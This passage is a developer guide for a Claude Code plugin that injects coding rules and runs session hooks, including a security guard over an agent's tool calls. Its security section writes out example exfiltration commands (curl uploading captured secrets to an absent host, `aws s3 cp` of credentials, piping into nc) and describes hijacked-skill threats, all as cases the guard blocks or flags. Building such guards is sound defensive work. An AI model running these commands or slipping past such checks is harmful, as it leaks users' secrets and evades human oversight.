# CLAUDE.md — working on Clawness

Orientation for agents/devs working **on** this repo. User-facing docs live in
[README.md](README.md); release history in [CHANGELOG.md](CHANGELOG.md). This file
captures architecture, conventions, and the *why* behind non-obvious decisions.

## What this is
A **Claude Code plugin** that retrieves relevant coding rules and injects them
into every prompt via a `UserPromptSubmit` hook. Pure Python; **PyYAML is the only
dependency**. No ML models, no services, no Docker.

## Architecture (request flow)
1. `hooks/claude_hook.py` (UserPromptSubmit) loads global rules (plugin/clone
   `rules/`) + project rules (`<project>/.clawness/rules/`), retrieves, prints the
   block to stdout → Claude sees it.
2. Retrieval engine = `clawness/core.py`: **BM25 + TF-IDF fused via RRF**, over a
   **concept-expanded** token stream (`_CONCEPT_GROUPS`) + light stemming.
   Mandatory rules (`rules/_mandatory/`) always injected; rest ranked + budget-capped.
   A **relevance floor** (`CLAW_MIN_RELEVANCE`, default 0.06, gauged on TF-IDF cosine —
   not RRF, which is rank-based) drops scattershot matches so signal-less prompts
   inject few/no ranked rules. **Codebase-aware:** the hook detects the project stack
   (`detect_stack` → `scan_project`, fresh each prompt) and passes it to `Clawness`;
   off-stack language/framework rules (`_STACK_DOMAINS` minus detected) face a higher
   floor (`CLAW_OFFSTACK_MIN_RELEVANCE`, default 0.15) so e.g. a Python repo doesn't
   surface SQL/React noise, while strong cross-domain matches still pass. Cross-cutting
   domains (general/meta/workflows/security/testing) are never penalized.
   **`science`/`research` are cross-cutting but topically NARROW** (`_TOPICAL_DOMAINS`),
   so they take a middle floor (`CLAW_TOPICAL_MIN_RELEVANCE`, default 0.12) between the
   base and off-stack floors: un-gated, so a researcher in a bare/LaTeX-only directory
   still gets them, but they must genuinely match. At the base floor (1.3.0) 11 of 30
   routine dev prompts surfaced one; the stack filter makes this WORSE, not better,
   since suppressing off-stack rules frees top-k slots these then fill. That is also
   why `clawness query` (no stack) cannot see this class of bug — drive the real hook
   against a project fixture instead.
   **`cfd`/`julia`/`fortran`/`matlab`/`r` are the mirror case** (`_NARROW_STACK_DOMAINS`,
   1.6.0): stack-gated AND vocabulary-colliding, so off-stack they take a *fourth* floor
   ABOVE the ordinary one (`CLAW_NARROW_MIN_RELEVANCE`, default 0.22). Their core words
   are ordinary dev words — measured against the real hook in a Python repo, "the solver
   is not converging, fix the residual bug" scored CFD-CONVERGE-001 at **0.190** and
   "vectorize this dataframe loop" pulled in MATLAB (0.193) and R (0.163), all clearing
   the 0.15 off-stack floor. Routine dev prompts top out at 0.193; an explicit ask
   ("which turbulence model for this openfoam case") starts at 0.264, so 0.22 sits in the
   gap. **The high bar costs them nothing where they matter** — in their OWN project they
   are on-stack and the floor never applies. Don't fold them back into the plain off-stack
   tier: unlike sql/docker (a Python service really does talk to Postgres) there is no
   such thing as needing Fortran conventions while writing TypeScript. Note `_floor_for`
   must test the narrow set BEFORE returning the off-stack floor — these domains are in
   `_STACK_DOMAINS` too, so the reverse order makes the tier dead code. Passing no
   stack (CLI/eval) disables the penalty, so eval is unaffected. ~2ms/prompt + ~3ms scan
   (retrieval is <1% of the ~400ms hook, which is dominated by interpreter startup).
   **Session-aware re-injection** (`clawness/session_state.py`): the mandatory block
   (identical every turn) renders in full only on prompt 1 and every `CLAW_FULL_EVERY`-th
   prompt after (default 5); other turns get a one-line id list — the rules stay just as
   binding, only their re-statement shrinks. State is a per-session JSON file in the OS
   temp dir (never the project), fails toward a full render on any error. Project
   memory does NOT ride this cadence — see below.
3. **Project memory** (`<project>/.clawness/memory.md`, logic in `clawness/memory.py`):
   a per-codebase lessons log, appended after the rules block. **Retrieved, not
   dumped** (since 1.2.0): `parse_memory` splits the file into `## Always` entries
   (pinned, always injected, capped by `CLAW_MEMORY_PIN_BUDGET`) and `## Lessons`
   entries, which `rank_lessons` ranks against the prompt — same BM25 + TF-IDF + RRF
   primitives as the rules, so a 200-entry log still costs a flat handful of lines.
   HTML comments and headings are stripped: they're for the human editing the file and
   cost ~107 tokens/turn on an otherwise *empty* log, which is what prompted the rework.
   Three deliberate choices:
   - **Memory ranks in its OWN pass, never merged into `Clawness._ranked_rules`.**
     Lessons can't displace rules from `top_k`, rules can't displace lessons, and
     `rank_ids` stays rule-only so `tests/ground_truth.json` and the CI eval floors are
     immune to whatever a user writes in their memory file.
   - **`memory.py` has its own stopword list.** Across 113 rules, IDF flattens
     "this"/"the"/"needs" on its own; across a 4-40 entry log those words look
     discriminating, and without the filter "rename THIS variable" matched "BUILDKIT=1
     on THIS machine" above the floor. Don't remove it thinking IDF covers it.
   - **`CLAW_MEMORY_MIN_RELEVANCE` defaults to 0.20, not the rules' 0.06.** Small-corpus
     cosines run hot; measured, genuine hits score 0.44-0.70 and incidental overlap
     0.07-0.09, so 0.20 sits in the gap.
   Because the block is already prompt-specific and ~3 lines, it ships every turn rather
   than being abbreviated. `memory_changed` (session_state) now drives `force_recent`
   instead of a cadence: the newest entries show on the session's first prompt and on
   any turn after the file changed, so a lesson written mid-session is never invisible.
   Memory (and the few fixed suggested-action lines) sit *outside* `CLAW_BUDGET` by
   design — counting them in would make rule selection vary with memory length; total
   injection ≈ `CLAW_BUDGET` + `CLAW_MEMORY_BUDGET` + a few fixed lines.
   `ENF-MEM-001` (mandatory) is the single rule telling Claude to maintain the file and
   carries the numeric contract (one line, <=120 chars, max 3 pinned, prune past 40); it
   absorbed the near-duplicate ranked `WF-LESSONS-001`, which is gone. The file is
   auto-created on first session by `hooks/memory_init.py` (SessionStart) — gated to
   git work trees, opt-out `CLAW_NO_MEMORY`; it injects a note (like `git_check`) so
   Claude announces the file to the user, since hooks can't prompt directly.
   That hook has a **second, independently gated concern (1.8.0): offering the
   `.gitignore` block for `.clawness/`.** Same consent shape — it asks, never edits.
   `memory.md` and `rules/` are meant to be committed; `handoff.md`, `handoffs/` and the
   ledgers are per-machine. The block is an **allowlist** (`.clawness/*` plus `!` for the
   two shared paths) so a ledger added in a future version is ignored by default, and the
   trailing `/*` is load-bearing — ignoring the bare directory stops git descending and
   the negations silently do nothing (`tests/test_memory.py` pins this by applying the
   block for real and asking `git check-ignore`). Coverage is asked of **git**
   (`check-ignore`), not of `.gitignore`'s text, so a global or wholesale rule counts and
   is left alone. It needs its own ledger (`.clawness/gitignore.json`) because, unlike
   creating memory.md, a declined offer isn't self-limiting; checked LAST, as everywhere
   else. The two halves don't gate each other: a project that predates 1.8.0 has a
   memory.md already and still needs the ignore rule.
4. **Context-pressure watch** (`clawness/context_watch.py`, called from `claude_hook`):
   reads the session's own transcript (`transcript_path` in the hook payload; falls
   back to reconstructing `<config>/projects/<slugified-cwd>/<session_id>.jsonl`) and
   warns the user *before* the window fills and quality degrades. Rides the existing
   UserPromptSubmit hook rather than adding one — it's a file tail plus arithmetic
   (~0.5ms), not worth another process spawn per prompt.
   - **Context size is read, not estimated.** The last assistant entry's
     `input_tokens + cache_creation_input_tokens + cache_read_input_tokens` IS the
     prompt that was just sent. Only the last 256KB of the file is read (a transcript
     reaches several MB; a 6MB tail costs ~0.7ms), walking backwards to the newest
     usage record.
   - **The window can't be read from the transcript** — a 1M session records the same
     `claude-opus-5` model id as a 200k one. `infer_limit` therefore goes
     `CLAW_CONTEXT_LIMIT` → the `[1m]` marker on `model` in settings(.local).json →
     observed-usage tier bump. **Don't drop the settings check**: without it a 1M
     session false-alarms all through 140k-200k, which is exactly how users learn to
     ignore the warning.
   - Levels: `warn` (70%, brief mention), `urgent` (85%, recommend a fresh session and
     offer a handoff + memory write), and `surge` — a single turn adding >=12% of the
     window with <=5 turns of headroom left, so a session filling fast is flagged while
     there's still room to act. Below `MIN_TOKENS_TO_REPORT` (20k) it never speaks.
   - **Each level alerts at most once per session** (`should_alert_context`);
     escalation warn→urgent passes, repeats don't. The condition stays true once
     reached, so without dedup it would fire every prompt for the rest of the session.
   - Fails silent on every path, opt-out `CLAW_NO_CONTEXT_WATCH`.
5. **Session handoff** (`clawness/handoff.py` + `hooks/handoff_check.py`, SessionStart):
   the other half of the context watch. At ~85% full it offers to write
   `<project>/.clawness/handoff.md`; the SessionStart hook injects that file when the
   *next* session in the project starts, so the user never has to remember it exists
   or know its path. `WF-HANDOFF-001` (ranked) tells Claude where and how to write one.
   - **handoff.md and memory.md are different things and must not be merged.**
     memory.md accumulates durable lessons and is committed/shared; handoff.md is one
     transient "here's where I was", overwritten each time and personal (gitignore it).
   - **The note injects the handoff's CONTENT, not a pointer.** A pointer costs the
     next session a tool call and depends on Claude choosing to follow it — the whole
     point is that the user shouldn't have to shepherd the pickup.
   - **The file's existence IS the state** — a handoff at that path hasn't been picked
     up. There is deliberately no age cutoff or done-flag: an old handoff nobody
     archived is still outstanding. `archive_handoff` moves it to
     `.clawness/handoffs/done/<timestamp>.md` when superseded (a new one is written, or
     the user says it's finished), which clears the live slot and keeps history.
     Nothing is ever deleted; an over-eager archive then costs nothing. Age IS shown in
     the note, but only as information — it never branches the instruction.
   - **"Carry on" means START, not summarize-and-wait (1.6.0).** The instruction used
     to end *"then wait for them. Don't start the work unless they ask"*, which threw
     away the reason the handoff exists — the user wrote it so the next session wouldn't
     need an interview. It is now **conditional, and must stay conditional**: SessionStart
     fires before the user's first message, so the note cannot know whether they will say
     "carry on" or open a fresh task, and it has to carry both branches. What makes the
     continue branch safe is the template's **`## Open questions`** section — the note
     bounds questions to what is listed there, so "don't ask" can't mean "guess". If you
     ever drop that section, restore the interview.
   - **The session name is a SUGGESTION, and cannot be anything else (1.9.0).** An
     unnamed session is titled from the user's first message, so every pickup reads
     "carry on" in their history — the one phrase all pickups share. Claude Code has
     a built-in `/rename [name]` (alias `/name`; bare, it generates a kebab name from
     the conversation), but a slash command can only be TYPED: no hook can rename a
     session and neither can Claude. `suggest_session_name` therefore derives a name
     from the handoff's `# ` heading and the note asks Claude to surface the one-liner
     once, on the pickup branch only — the heading is the wrong name for a session the
     user opened on something else. It returns "" (and the note says nothing) when the
     heading has no letters after cleaning, which is exactly the template's default
     `# Handoff — {date}`: a suggestion the user has to read and reject costs more
     than silence. Don't "improve" this by writing `name`/`nameSource` into
     `<config>/sessions/<pid>.json` — that file is the CLI's own live state, in an
     undocumented shape, and it may well hold it in memory anyway.
   - Truncation keeps the **head** (budget `CLAW_HANDOFF_BUDGET`, default 2000) —
     opposite of the lessons log, because a handoff's summary and state are written at
     the top. `## Open questions` is last and therefore the first thing truncated away;
     that's the right trade (it usually says "none") and `tests/test_handoff.py` pins it
     rather than leaving it undefined. Opt-out `CLAW_NO_HANDOFF`.
6. **Framework-version awareness** (`VERSION_WATCH_*` in `clawness/init.py`, surfaced by
   `stack_detect`): `scan_project` returns a `versions` dict alongside `domains`, and the
   SessionStart note reads "Next.js 14.2, React 18.3" rather than bare labels.
   - **Parsed at SessionStart ONLY.** `detect_stack` (per-prompt) still reads `domains`
     and ignores `versions`, so the hot path is untouched. `scan_project` re-runs on
     *every prompt* uncached — don't move version parsing onto that path without a TTL
     cache first (the `guard_provenance_cache.json` pattern).
   - **Unparseable means omitted, never guessed.** `*`, `latest`, a git URL or a
     workspace protocol yield "" and the framework falls back to its bare label. A wrong
     version is worse than none: it gets acted on.
   - The watch list is deliberately short — only frameworks whose majors change the code
     you write (App Router vs Pages, Pydantic v1 vs v2, SQLAlchemy 1.4 vs 2.0). It is not
     an inventory; the manifest is right there. `GEN-INSTALLED-VER-001` is the durable
     half, and it is distinct from `GEN-DEPS-001`/`ENF-SEC-005`, which are about
     *choosing* a version for a NEW dependency rather than *matching* an existing one.
6b. **Corpus staleness** (`clawness/staleness.py`, surfaced by `stack_detect`'s
   `check_staleness`; remedy in `skills/refresh/SKILL.md`): a rule may carry
   `applies_to`/`verified`/`sources` recording the versions it was established
   against, and the note fires when the project declares one past that range.
   - **The relevance floor cannot catch this.** It detects unfamiliar *vocabulary*;
     a major bump keeps the words ("route", "cache", "app router") and changes their
     meaning, so a 14-era rule scores like an ordinary match on a v17 prompt.
     Measured on the live corpus: NX-CACHE-001 at 0.112, NX-ROUTE-001 at 0.121.
   - **Stamps are per RULE, never per domain.** A domain range is the union of its
     rules' ranges — structurally the widest claim available — and too-wide fails
     *silent* while too-narrow produces a visible false alarm that gets corrected.
     Don't "simplify" this by stamping folders.
   - **Only a verified stamp arms the warning** (`is_armed`): `applies_to` without
     `verified` *and* `sources` is asserted, not established, and stays silent. The
     feature therefore ships doing nothing until real review has happened — that is
     the honest behaviour, not a shortcoming. Establishing a range is an OUTPUT of
     review; there is no way to derive it (git dates are a weak proxy, rule text
     names an API not a version).
   - Grammar is an inclusive `"13-15"` / `"15"` / `"1.4-2.0"`, one or two numeric
     components per bound — the shape `_clean_version` produces. Ceilings pad with a
     sentinel (`"15"` covers 15.9) because padding with 0 would false-alarm on 15.1.
     **Open-ended (`"13-"`) is deliberately inexpressible**: "and everything after"
     is the claim nobody has evidence for. Below-floor mismatches are silent — the
     corpus is written forwards, so warning there fires on every un-upgraded project.
   - The join key is the DETECTOR's label (`"Next.js"`), since that is how
     `scan_project` keys `versions`. A typo'd label never matches, so the check goes
     silently inert while looking configured — which is why `clawness lint` validates
     membership in `WATCHED_LABELS` mechanically. That is the check to watch fail
     first (TST-FAILFIRST-001).
   - **The note orients; it does not commission work**, and its text is a tested
     artifact (`TestNoteText`). An earlier attempt had Clawness author rule files
     from the automatic path and it wrote heaps of them, eating the session — the
     same failure as 1.7.0's CLAUDE.md remedy, and for the same reason: a
     SessionStart note fires before the user has said what they came for. So the
     note names `/clawness:refresh` and starts nothing, permits only a passively
     triggered one-line append to `.clawness/memory.md` (`SESSION_BACKSTOP`, a
     judgment call — the real bound is "if you happen to establish… while doing the
     user's work"), and never names `.clawness/rules/`.
   - Reads stamps from global AND project rules, project winning by id, so rules
     `/clawness:refresh` generates are stale-checked by the same mechanism when the
     project moves again. Without that they'd be the one class that never can be.
   - **The ledger keys on the fact, not a date** (`.clawness/staleness.json` stores
     label → detected version): once per mismatch, re-arming when the version moves.
     A "checked today" flag was rejected — it goes silent for the rest of the day if
     the user upgrades at 2pm having been checked at 9am, and re-asks forever once
     declined. Same shape as `claude_md_check`'s size ledger. Revisit only if a
     future version asks npm/PyPI what the current major *is* (network I/O, where a
     TTL cache becomes correct). `unasked` is called LAST; opt-out
     `CLAW_NO_STALENESS_NOTE`; fails silent on every path.
   - **Don't auto-suppress stale rules.** A rule that's 80% right beats silence,
     provided Claude knows to check — which is what the note buys.
   - Known limit: covers only the ~14 `VERSION_WATCH_*` packages, detects *version*
     drift only (not a framework abandoned outright, nor a rule wrong when written).
   - **Four whole domains are structurally unstampable, found while stamping for
     1.9.0 — don't rediscover them.** `python` has no join label at all: the watch
     list is frameworks, not the interpreter, so a `"Python"` key fails lint and
     there is nothing else a `PY-*` rule can key on. Adding one would mean detecting
     the *interpreter* version, which `_python_version` (a dependency reader) does
     not do. And the `fastapi`-labelled rules are deliberately left bare because
     FastAPI ships `0.x`: `_clean_version` yields two components, so the effective
     major is the minor, which moves every few weeks — any ceiling false-alarms
     almost immediately. The version-sensitive claims in that domain hang off
     `Pydantic` and `SQLAlchemy` instead, which have real majors. `typescript` and
     `css` are unstampable for the *opposite* reason — the label has a fine major,
     the CLAIM doesn't. "Enable `strict`, prefer `unknown` to `any`", "`??` not
     `||`", "Flexbox for one dimension, Grid for two" were true before TypeScript 7
     and will be true after 8, so a ceiling on them buys exactly one guaranteed
     false alarm per major. (`css` has no Tailwind rule at all — the `Tailwind`
     label is in `VERSION_WATCH_JS` for the stack note's benefit, not because
     anything keys on it. Check before assuming a label implies corpus.) The
     general shape: **a stamp is only worth writing where the major changes the
     claim** — the label having a major is necessary, not sufficient.
   - **A review can find the rule WRONG, not just unstamped, and that is the point.**
     Two of the 1.9.0 domains turned up rules teaching a hazard that had reversed:
     `SCI-ARRAY-001` on pandas views (3.0's Copy-on-Write inverted it — chained
     assignment now silently no-ops where it used to mutate-and-warn) and
     `CAP-WEBVIEW-001` on the Status Bar plugin (inert under Capacitor 8's
     unconditional edge-to-edge). Prefer rewriting the rule to carry BOTH eras over
     capping it at the old major: a ceiling makes users on the old version see a
     note about a rule that is still correct for them, while the rewrite serves
     everyone and the stamp then records the range you actually checked.

7. **Changelog check** (`hooks/changelog_check.py`, SessionStart): reminds when a
   changelog exists, and asks **once per project, ever** when one doesn't — ledger at
   `.clawness/changelog.json`, `should_ask` called LAST so a session that would have
   stayed quiet doesn't burn the one shot. Never creates the file itself; same consent
   shape as `git_check`'s `git init`. Opt-outs: `CLAW_NO_CHANGELOG_CHECK`, or a
   `.clawness/changelog-check-off` marker. **The nag ledgers (`changelog.json`,
   `model_advice.json`, `claude_md.json`) are deliberately NOT guard control files** —
   forging one suppresses a question, not a guard, and listing them would make routine
   `.clawness/` writes start asking.
8. **CLAUDE.md size check** (`hooks/claude_md_check.py`, SessionStart) + the routing
   clause in `ENF-MEM-001`: the two halves of keeping CLAUDE.md and `.clawness/memory.md`
   from fighting over "remember this".
   - **The economics are the whole argument.** CLAUDE.md is loaded by the harness, in
     full, on every turn, *before any hook runs* — the one context cost nothing here can
     cap, while the rules block is budgeted and the lessons log is ranked and budgeted.
     Default threshold 6000 estimated tokens (`CLAW_CLAUDE_MD_LIMIT`): above that the
     file outweighs Clawness's entire injection at full stretch (~851 mandatory + ~3,149
     ranked), forever. This repo's own is ~9,151.
   - **The split is THREE-way and the bulk goes to `.clawness/rules/`, not memory.md.**
     memory.md is sized for a lessons log (top-3, ~1200 chars, 120/entry, merge past 40)
     — a 36k-char CLAUDE.md is 300+ entries to surface three lines, with the line cap
     shredding the rationale that was the payload. Project rules take the same ranking
     engine with no line cap and the full rule format. One-line traps only go to memory.
   - **Anything shaped like "don't undo this" STAYS in CLAUDE.md.** Retrieval is lossy,
     and that content is load-bearing exactly when the prompt gives no hint it applies.
     A missed rule is a slightly worse answer; a missed "don't undo this" is the
     regression it existed to prevent — see the plan gate sitting off for a month.
   - **Indexing CLAUDE.md like memory.md was rejected, don't rebuild it.** The harness
     has already loaded it by hook time and UserPromptSubmit can only append, so ranked
     chunks duplicate the full copy. The corollary: making CLAUDE.md cheaper is
     necessarily *destructive*.
   - **The hook is the diagnosis; `skills/claude-md/SKILL.md` is the remedy (1.8.0).**
     1.7.0 had the SessionStart note offer a guided three-way relocation. Dogfooding it
     here worked and that was the problem — it ate most of a session opened for
     something else. The bug was the *timing*, not the content: a SessionStart note
     fires before the user has said what they came for, so it can't propose a long
     destructive refactor. The content moved verbatim into `/clawness:claude-md`, where
     the user typing the command IS the consent, and the note now names that plus
     Claude Code's `/doctor` and starts neither. If a later version wants the hook to do
     more, improve the skill instead.
   - **`@path` imports don't reduce cost, and the docs are explicit: "imported files
     are expanded and loaded into context at launch", recursive to four hops.** So
     reorganising CLAUDE.md into `@` references — much the most popular version of this
     advice — moves zero tokens, and neither do `.claude/rules/` files without `paths:`
     frontmatter. The only mechanisms that actually defer cost are `paths:`-scoped
     `.claude/rules/`, nested `<subdir>/CLAUDE.md`, skills, and our own ranked
     `.clawness/rules/`. The check still doesn't follow `@path` (that means
     reimplementing the harness's parser), so its number under-reports an import-split
     file — a known-real false negative that errs toward silence.
   - **Firing on the project's FIRST session instead was rejected.** CLAUDE.md is
     usually absent or small then; the bloat accrues over months, so first-session
     gating would never fire for the case the check exists for.
   - **The ledger stores the SIZE, not a boolean** (unlike `changelog.json`, which
     answers a yes/no question once). Re-arms at 1.5x growth: "asked at 6k, silent
     forever at 30k" is the same absent-prompt failure as the old plan-gate off switch.
     A ledger that says `asked` but carries no size counts as answered.
   - Tokens are estimated at chars/4, never tokenized (PyYAML stays the only dependency),
     so the note says "roughly". `@path` imports are deliberately not followed — that
     needs the harness's import semantics verified first, and under-reporting a
     split-up CLAUDE.md is a false negative, which costs nothing.
   - `ENF-MEM-001` carries the routing half: lessons go to memory.md, never CLAUDE.md.
     It governs everything *Claude* writes but cannot touch the user typing `#`, which
     writes straight to CLAUDE.md with no hook in the path — say so in the README rather
     than pretending the routing is total. The rule sits at 485 of the 500-char mandatory
     ceiling, so anything added to it has to be paid for by trimming.
   - Opt-outs `CLAW_NO_CLAUDE_MD_CHECK`, `.clawness/claude-md-check-off`. `should_ask`
     called LAST, fails silent.
9. **Model-tier advisor** (`clawness/model_advisor.py`, stashed by `stack_detect`,
   surfaced by `claude_hook` on prompt 1): compares the session's model tier against
   what the opening task looks like and injects a note when they look mismatched.
   - **The model must be carried across two hook events.** ONLY `SessionStart`
     receives a `model` field (and the docs mark it optional — hence the
     `read_settings_model()` fallback); `UserPromptSubmit` never does. But at
     SessionStart there is no task yet, and codebase complexity is the wrong signal
     (a README edit in a huge repo is trivial). So `stack_detect` stashes the model
     via `session_state.record_model`, and prompt 1 of `claude_hook` reads it back.
     Don't "simplify" this into one hook — neither event has both halves.
   - **Evidence, not verdict.** The note reports the matched signals and explicitly
     licenses Claude to say nothing. The heuristic WILL misfire; letting Claude
     filter against the real task means a wrong guess usually dies before the user
     sees it. A hook asserting "switch to X" would surface every false positive.
   - **The thresholds are asymmetric on purpose.** An upgrade hint needs 2 signal
     groups. A downgrade needs 2 *and* zero upgrade signals *and* a short prompt,
     because a wrong downgrade is invisible harm — a shallower answer on hard work
     reads exactly like a good one — while a wrong upgrade costs visible money.
   - **opus and fable are both `TIER_TOP`.** There is no defensible ordering between
     them, so a top-tier session is never told to move.
   - Fails **silent**, not open (the opposite of the context watch): an unknown model
     or unreadable ledger means say nothing. Dedup is once per project per tier in
     `.clawness/model_advice.json`, so a tier change re-arms it. `CLAW_NO_MODEL_ADVISOR`.
   - `tests/model_advisor_cases.json` is its eval set, and the CI floor is **zero
     false positives** on routine prompts. Grow that file when tuning signals.

10. **Session security** (defense, not retrieval — independent of the engine):
   - `hooks/access_guard.py` (PreToolUse; logic in `clawness/guard.py`) classifies each
     Bash/Write/Edit/Read call → `allow`/`ask`/`deny`. A hook decision overrides the
     user's permission allowlist, so `ask` fires *even on "always-allowed" tools* — the
     answer to approval fatigue. **`deny` is a HARD block with no in-Claude override**
     (verified on the VS Code build — the user can't approve it inline; retrying re-fires),
     so reserve it for ~zero-legit-use / exfil-signature cases: cloud-metadata,
     catastrophic `rm -rf` (a filesystem root / home / a *system dir itself* — a delete
     DEEPER under a system dir is ASK, not deny), reading a local secret into a network
     call, uploading a local secret (incl. via a cloud CLI — `aws s3 cp ~/.aws/credentials
     s3://…`), and **inline-capture** exfil — `$(…)`/backtick output embedded in a data
     upload to a host absent from the codebase. **The exfil denies are evaluated UP FRONT
     (before any ASK tier) on purpose** — `_classify_bash` returns on first match, so a
     compound command (`rm -rf ~/x && curl -d "$(cat s)" https://absent/`) would otherwise
     let an early ASK clause mask a later deny; don't reorder them below the ASK checks.
     A shell `>`/`>>` redirect to a control file (`_bash_redirect_hits_control_file`) is
     also caught, since it bypasses the Write-tool gate. Crucially a
     bare token env var (`Bearer $API_TOKEN`) is NOT a deny signal — it's routine auth,
     so a token-authenticated POST to an internal host absent from committed source only
     ASKS (see `_INLINE_CAPTURE_RE` vs `_VAR_EXPANSION_RE`). **`ask`** (which DOES surface
     an approve dialog) covers the dual-use and scope cases: pipe-to-shell and
     `git push --force` (not `--force-with-lease`, allowed), writes outside the project
     root (temp/plan files exempt via `is_plan_file`), credential-shaped reads, named
     installs, deep-system-dir deletes, data piped into a raw socket (`… | nc`), **any**
     cloud-storage upload (`aws s3 cp`/`gsutil`/`az blob`), and a credential-named URL
     download. The `_deny` reason text must not tell the model to "proceed on
     confirmation" — it can't; it points to the real escape hatches (run it yourself /
     `CLAW_NO_ACCESS_GUARD=1`). **Data-bearing curl/scp egress is provenance-tiered**:
     `value_in_project` searches the destination host across the project's own text files
     — a bounded walk that EXCLUDES `.claude/` so a hijacked skill can't launder a host
     into "trusted", 15-min verdict cache — endogenous (in the repo) → ask, absent → ask
     (or deny for the inline-capture shape). Note a known host still ASKS for a data
     upload; provenance only flips the inline-capture case between deny and ask, so it can
     never buy a *silent* egress. **Cloud uploads are deliberately NOT provenance-downgraded
     to allow** — source is forgeable (a rogue postinstall or injected Write could plant a
     bucket name), so `aws s3 cp <secret> s3://planted-bucket` would be silent exfil; every
     cloud upload asks once per bucket instead. Asks once **per destination** per session:
     for egress the dedup key is the host/bucket (`_egress_targets`), not the exact command,
     so iterating upload payloads to one host asks once; an **out-of-project write keys on
     its parent DIRECTORY** (approve a location once — e.g. the `~/.claude` memory dir — and
     sibling writes there don't re-nag; a security-*control* file stays keyed per-file so
     blessing a dir can't cover a sibling kill switch); other tiers key on the path/command. Keys are sha256-hashed so raw command
     text never touches disk. **Two-phase**: PreToolUse records a target `pending`; a
     PostToolUse companion (same matcher) promotes it to `confirmed` only once the call
     actually completes AND the payload carries a `tool_response` (execution evidence —
     defense-in-depth so a declined call never settles even if a build fired PostToolUse
     for it), so a declined/abandoned ask re-asks on retry instead of going silent for the
     session. Ledger/cache writes are atomic (`atomic_write_text`, temp + `os.replace`) so
     concurrent sessions never read a torn file. Pure-logic core, fails open, `CLAW_NO_ACCESS_GUARD`.
   - `hooks/trust_ledger.py` (SessionStart; logic in `clawness/trust.py`) keeps TOFU
     fingerprints of skills/agents/commands/MCP servers in `.clawness/trust_ledger.json`
     and injects a note when one changed/appeared; `clawness audit-skills` scans those
     artifacts for injection tells. Fails open, `CLAW_NO_TRUST_LEDGER`.

## Key files
- `clawness/core.py` — engine (rules loader, tokenizer + `_CONCEPT_GROUPS`, BM25,
  TF-IDF, RRF, `Clawness` class, `rank_ids`, rendering).
- `clawness/memory.py` — project-memory parsing + ranking (`parse_memory`,
  `rank_lessons`, `render_memory_block`). Imports the primitives from `core`, so
  `core.render_memory_block` delegates via a *deferred* import to avoid a cycle.
- `clawness/cli.py` — `clawness` CLI: query, stats, lint, bench, eval, init, plan,
  agents-md, audit-rules, audit-skills. **`audit-rules` is report-only and NOT
  CI-gated**, unlike lint/eval: every check is a judgment call dressed as a number
  (an overlapping pair may be two correct rules; an unstamped rule may not need a
  stamp), so `--strict` is opt-in. Its `--overlap` uses the engine's own TF-IDF doc
  vectors, so "similar" means what the retriever means. `--max-age` deliberately has
  no default — an invented cadence gets argued with instead of acted on.
- `clawness/plan.py` — plan-gate logic (`gate_decision`, `is_plan_file`, session approval).
- `clawness/guard.py` — access-guard logic (`classify_tool_call`, `value_in_project`, ask-ledger).
- `clawness/trust.py` — trust-ledger logic (`scan_artifacts`, `diff_ledger`, `scan_injection_tells`).
- `clawness/session_state.py` — per-session prompt-count/memory-mtime tracking for
  session-aware re-injection (`bump_prompt_count`, `memory_changed`, `should_show_full`),
  plus context-watch state (`context_snapshot`, `should_alert_context`).
- `clawness/context_watch.py` — context-pressure watch (`read_context_tokens`,
  `infer_limit`, `assess`, `render_alert`, `find_transcript`). `limit_from_settings`
  delegates the settings read to `model_advisor.read_settings_model` (one source of
  truth for "what model is configured?"), keeping only the `[1m]` reading here.
- `clawness/model_advisor.py` — model-tier advice (`normalize_tier`, `assess`,
  `should_advise`, `render_advice`, `read_settings_model`).
- `clawness/staleness.py` — version stamps (`parse_range`, `is_above_ceiling`,
  `is_armed`, `stale_rules`, `summarize`, `unasked`, `render_note`,
  `WATCHED_LABELS`). Imports `VERSION_WATCH_*` from `init` — one source of truth for
  the join labels. Called only from `stack_detect` (SessionStart), never per prompt.
- `clawness/handoff.py` — session handoff (`find_handoff`, `render_handoff_note`,
  `describe_age`, `HANDOFF_TEMPLATE`).
- `hooks/` — runtime hooks (`claude_hook`, `compress_output`, `plan_gate`, `access_guard`,
  `trust_ledger`, `git_check`, `memory_init`, `handoff_check`, `stack_detect`,
  `changelog_check`, `claude_md_check`, `ensure_deps`) + setup helpers
  (`setup_settings/agents/skills` —
  manual install only). `hooks/_hookutil.py` is shared plumbing (UTF-8 stdio pinned at
  import, `read_payload`, `session_cwd`, `git_root`, `project_root`) — imported, never
  registered. Every SessionStart note hook uses it; `git_check` keeps its own *downward*
  tree scan because "is git used anywhere relevant?" is a different question from
  `git_root`'s upward walk.
- `rules/<domain>/*.yml` — the corpus (212 rules / 29 domains; `_mandatory/` = always-on).
  Beyond the language domains: `llm/` (building with models — stack-gated, detected from
  anthropic/openai/langchain deps), `ml/` (training/evaluating your OWN models — leakage,
  CV, calibration — stack-gated on modelling libs sklearn/xgboost/torch/statsmodels, so it
  fires for any model-training codebase, science or not; note its rule ids use the `MLD-`
  prefix because `matlab/` owns `ML-`), `science/` and `research/` (physics/maths/engineering
  practice and research method — **cross-cutting on purpose**, since a researcher often
  works in a bare or LaTeX-only directory where gating would silence them), plus
  `reliability/`, `testing/` and `ci/`. `cfd/`, `julia/`, `fortran/`, `matlab/` and `r/`
  are stack-gated AND take the narrow floor — see `_NARROW_STACK_DOMAINS` below.
- `agents/*.md`, `skills/<name>/SKILL.md` — auto-discovered by the plugin.
- `.claude-plugin/{plugin.json,marketplace.json}` — plugin + marketplace manifests.
- `tests/ground_truth.json` — labeled eval queries (grow it when adding rule areas).
- `tests/test_cli.py` — drives the `clawness` CLI as a subprocess. It exists because
  `lint` and `eval` gate CI, so what matters is that they exit **non-zero** on bad
  input, which is invisible when you call `cmd_lint`/`cmd_eval` directly. It's also
  the only test that reaches the narrow off-stack tier without a live hook, via
  `query --stack`.

## Design decisions (don't undo without reading these)
- **Lexical + concept retrieval only.** model2vec/semantic was removed in 0.3.0:
  a per-prompt hook is a fresh process every turn, so the model reloaded each time
  (blew the hook timeout), and it scored no better than lexical on the eval. The
  **concept dictionary (`_CONCEPT_GROUPS`) is our "semantic"** — enrich *that* for
  better recall, never add a model to the hot path.
- **Hook commands use a portable interpreter picker** `for p in python3 python py; …`
  (Windows has no `python3`; Claude runs hooks via a POSIX shell). Same picker in
  `plugin.json` and what `setup_settings.py` writes.
  - **The trailing `; exit 0` on every hook command is load-bearing (1.9.0).** With
    no interpreter on PATH every `command -v` fails, the `&&` short-circuits, and
